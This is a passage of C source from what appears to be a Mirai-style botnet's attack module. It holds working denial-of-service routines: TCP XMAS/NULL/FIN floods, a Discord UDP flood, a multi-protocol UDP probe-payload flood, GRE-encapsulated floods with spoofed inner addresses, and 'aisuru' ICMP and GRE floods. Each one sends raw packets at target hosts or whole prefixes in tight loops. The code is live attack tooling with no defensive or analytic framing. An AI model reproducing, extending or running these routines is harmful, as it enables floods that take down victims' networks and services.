        timeo.tv_sec = 3;
        timeo.tv_usec = 0;
        if (select(fd + 1, &fdset, NULL, NULL, &timeo) <= 0)
        { close(fd); continue; }

        int ret = recvfrom(fd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_len);
        if (ret > (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)) &&
            recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr)
        {
            struct tcphdr *tcph_recv = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
            if (tcph_recv->source == addr.sin_port && tcph_recv->syn && tcph_recv->ack)
            {
                struct iphdr *iph;
                struct tcphdr *tcph;
                char *payload;
                xmas_data[i].addr = addr.sin_addr.s_addr;
                xmas_data[i].seq = ntohl(tcph_recv->ack_seq);
                xmas_data[i].ack_seq = ntohl(tcph_recv->seq);
                xmas_data[i].sport = tcph_recv->dest;
                xmas_data[i].dport = addr.sin_port;

                pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                if (pkts[i] == NULL)
                { close(fd); continue; }
                iph = (struct iphdr *)pkts[i];
                tcph = (struct tcphdr *)(iph + 1);
                payload = (char *)(tcph + 1);

                iph->version = 4;
                iph->ihl = 5;
                iph->tos = ip_tos;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                iph->id = htons(ip_ident);
                iph->ttl = ip_ttl;
                if (dont_frag)
                    iph->frag_off = htons(1 << 14);
                iph->protocol = IPPROTO_TCP;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = xmas_data[i].addr;

                tcph->source = xmas_data[i].sport;
                tcph->dest = xmas_data[i].dport;
                tcph->seq = htonl(xmas_data[i].ack_seq);
                tcph->ack_seq = htonl(xmas_data[i].seq);
                tcph->doff = 5;

                tcph->urg = tcph->psh = tcph->fin = tcph->ack = tcph->rst = tcph->syn = 0;
                switch (profile)
                {
                case PROFILE_XMAS:
                    tcph->urg = 1; tcph->psh = 1; tcph->fin = 1;
                    break;
                case PROFILE_NULL:
                    break;
                case PROFILE_FIN:
                    tcph->fin = 1;
                    break;
                }
                tcph->window = rand_next() & 0xffff;
                if (data_rand)
                    rand_str(payload, data_len);
            }
        }
        close(fd);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

            sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

void attack_udp_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    const char discord_payload[] = "\x96\x13\x00\x10\xc2\x78\x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x00\x20\x72\x64\x00\x00";
    const size_t payload_len = sizeof(discord_payload) - 1;

    if (dport == 0xffff) {
#ifdef DEBUG
        printf("Error: DPORT must be specified!\n");
#endif
        return;
    }

    for (i = 0; i < targs_len; i++) 
    {
        targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = 0;
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
    }

    while (TRUE) 
    {
        for (i = 0; i < targs_len; i++) 
        {
            send(fds[i], discord_payload, payload_len, MSG_NOSIGNAL);
        }
    }
}

void attack_udp_nudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char* strings[] = {
            "\x0D\x0A\x0D\x0A",
            "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
            "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92",
            "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00",
            "\x00\x01\x00\x02\x00\x01\x00",
            "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00",
            "\x02\x01\x00\x006 \x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07 default\x00\x00\x00\x00",
            "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01",
            "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10",
            "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5",
            "SNQUERY: 127.0.0.1:AAAAAA:xsvr",
            "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0",
            "\x02",
            "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a",
            "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01",
            "xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6",
    };
    
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int si = i % (sizeof(strings) / sizeof(strings[0]));
            send(fds[i], strings[si], strlen(strings[si]) + 1, MSG_NOSIGNAL);
        }
    }
}

void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
                printf("Failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        #ifdef DEBUG
                printf("Failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        // GRE header init
        greh->protocol = htons(ETH_P_IP); // Protocol is 2 bytes

        // Encapsulated IP header init
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcp_udp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

        #ifdef DEBUG
            if (errno != 0)
                printf("errno = %d\n", errno);
            break;
        #endif
    }
}

void attack_icmp_echo_aisuru(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    int min_len = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 0);
    int max_len = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1460); // MTU-safe
    uint8_t sleepr = attack_get_opt_int(opts_len, opts, ATK_OPT_SLEEPR, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    // Clamp data_len to min/max bounds
    if (data_len < min_len) data_len = min_len;
    if (max_len && data_len > max_len) data_len = max_len;

    // Create raw socket for ICMP
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        free(pkts);
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
#endif
        close(fd);
        free(pkts);
        return;
    }

    // Build packets for each target
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct icmphdr *icmph;
        char *data;

        pkts[i] = calloc(1510, sizeof(char));
        if (!pkts[i])
        {
#ifdef DEBUG
            printf("Failed to allocate packet buffer\n");
#endif
            close(fd);
            while (--i >= 0) free(pkts[i]);
            free(pkts);
            return;
        }

        // Packet structure: IP -> ICMP -> Data
        iph = (struct iphdr *)pkts[i];
        icmph = (struct icmphdr *)(iph + 1);
        data = (char *)(icmph + 1);

        // IP header
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0; // Default ToS
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len);
        iph->id = 0; // Hardcoded, no randomization
        iph->frag_off = 0; // No DF bit
        iph->ttl = 64; // Hardcoded TTL
        iph->protocol = IPPROTO_ICMP;
        iph->saddr = LOCAL_ADDR; // Fixed source IP
        iph->daddr = targs[i].addr;

        // ICMP header (ECHO request)
        icmph->type = ICMP_ECHO;
        icmph->code = 0;
        icmph->un.echo.id = (sport == 0xffff) ? (rand_next() & 0xffff) : sport;
        icmph->un.echo.sequence = (dport == 0xffff) ? (rand_next() & 0xffff) : dport;
        icmph->checksum = 0;

        // Payload: random or zeroed
        if (data_rand)
            rand_str((uint8_t *)data, data_len);
        else
            memset(data, 0, data_len);
    }

    // Hardcoded flood loop
    for (i = 0; i < targs_len; i++)
    {
        char *pkt = pkts[i];
        struct iphdr *iph = (struct iphdr *)pkt;
        struct icmphdr *icmph = (struct icmphdr *)(iph + 1);
        char *data = (char *)(icmph + 1);

        // Randomize target IP for prefix attacks
        if (targs[i].netmask < 32)
            iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        // Randomize ICMP ID and sequence if ports are 0xffff
        if (sport == 0xffff)
            icmph->un.echo.id = rand_next() & 0xffff;
        if (dport == 0xffff)
            icmph->un.echo.sequence = rand_next() & 0xffff;

        // Randomize payload if enabled
        if (data_rand)
            rand_str((uint8_t *)data, data_len);

        // Randomize packet length within min/max bounds
        if (min_len > 0 && max_len > 0 && data_len == 0) {
            int rand_len = min_len + (rand_next() % (max_len - min_len + 1));
            iph->tot_len = htons(ntohs(iph->tot_len) - data_len + rand_len);
            data_len = rand_len;
            rand_str((uint8_t *)data, data_len);
        }

        // Calculate checksums
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        icmph->checksum = 0;
        icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + data_len);

        // Send packet
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
        targs[i].sock_addr.sin_port = 0;
        if (sendto(fd, pkt, ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Sendto failed: %s\n", strerror(errno));
#endif
        }

        if (sleepr)
            usleep(sleepr); // Throttle if sleepr is set
    }

    // Clean up
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
    close(fd);
}

void attack_gre_ip_aisuru(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    int min_len = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 0);
    int max_len = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1460); // MTU-safe
    uint8_t sleepr = attack_get_opt_int(opts_len, opts, ATK_OPT_SLEEPR, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    // Clamp data_len to min/max bounds
    if (data_len < min_len) data_len = min_len;
    if (max_len && data_len > max_len) data_len = max_len;

    // Create raw socket for GRE
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_GRE)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        free(pkts);
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
#endif
        close(fd);
        free(pkts);
        return;
    }

    // Build packets for each target
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(1510, sizeof(char));
        if (!pkts[i])
        {
#ifdef DEBUG
            printf("Failed to allocate packet buffer\n");
#endif
            close(fd);
            while (--i >= 0) free(pkts[i]);
            free(pkts);
            return;
        }

        // Packet structure: IP -> GRE -> Inner IP -> UDP -> Data
        iph = (struct iphdr *)pkts[i];
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);
        data = (char *)(udph + 1);

        // Outer IP header
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = 0; // Hardcoded, no randomization
        iph->frag_off = 0; // No DF bit
        iph->ttl = 64; // Hardcoded TTL
        iph->protocol = IPPROTO_GRE; // GRE protocol (47)
        iph->saddr = LOCAL_ADDR; // Fixed source IP
        iph->daddr = targs[i].addr;

        // GRE header
        //greh->flags = 0;
        greh->protocol = htons(ETH_P_IP); // Encapsulated IP

        // Inner IP header
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greiph->id = 0; // Hardcoded, no randomization
        greiph->frag_off = 0; // No DF bit
        greiph->ttl = 64; // Hardcoded TTL
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        greiph->daddr = rand_next(); // Random inner dest IP

        // UDP header
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
        udph->check = 0;

        // Payload: random or zeroed
        if (data_rand)
            rand_str((uint8_t *)data, data_len);
        else
            memset(data, 0, data_len);
    }

    // Hardcoded flood loop
    for (i = 0; i < targs_len; i++)
    {
        char *pkt = pkts[i];
        struct iphdr *iph = (struct iphdr *)pkt;
        struct grehdr *greh = (struct grehdr *)(iph + 1);
        struct iphdr *greiph = (struct iphdr *)(greh + 1);
        struct udphdr *udph = (struct udphdr *)(greiph + 1);
        char *data = (char *)(udph + 1);

        // Randomize target IP for prefix attacks
        if (targs[i].netmask < 32)
            iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        // Randomize ports if set to 0xffff
        if (sport == 0xffff)
            udph->source = rand_next() & 0xffff;
        if (dport == 0xffff)
            udph->dest = rand_next() & 0xffff;

        // Randomize inner dest IP
        greiph->daddr = rand_next();

        // Randomize payload if enabled
        if (data_rand)
            rand_str((uint8_t *)data, data_len);

        // Randomize packet length within min/max bounds
        if (min_len > 0 && max_len > 0 && data_len == 0) {
            int rand_len = min_len + (rand_next() % (max_len - min_len + 1));
            iph->tot_len = htons(ntohs(iph->tot_len) - data_len + rand_len);
            greiph->tot_len = htons(ntohs(greiph->tot_len) - data_len + rand_len);
            udph->len = htons(ntohs(udph->len) - data_len + rand_len);
            data_len = rand_len;
            rand_str((uint8_t *)data, data_len);
        }

        // Calculate checksums
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        greiph->check = 0;
        greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
        udph->check = 0;
        udph->check = checksum_tcp_udp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);

        // Send packet
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
        targs[i].sock_addr.sin_port = 0;
        if (sendto(fd, pkt, ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Sendto failed: %s\n", strerror(errno));
#endif
        }

        if (sleepr)
            usleep(sleepr); // Throttle if sleepr is set
    }

    // Clean up
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
    close(fd);
}

void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
